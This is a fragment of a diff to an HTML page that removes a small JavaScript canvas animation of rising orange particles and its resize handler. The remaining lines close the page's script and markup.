-        function drawPart(){ ctx.clearRect(0,0,cvs.width,cvs.height); ctx.fillStyle="rgba(255,69,0,0.3)"; pt.forEach(p=>{ ctx.beginPath(); ctx.arc(p.x,p.y,p.s,0,Math.PI*2); ctx.fill(); p.y-=p.d; if(p.y<0){p.y=cvs.height; p.x=Math.random()*cvs.width;} }); requestAnimationFrame(drawPart); }
-        window.addEventListener('resize', initCvs); initCvs(); drawPart();
     </script>
 </body>
 </html>
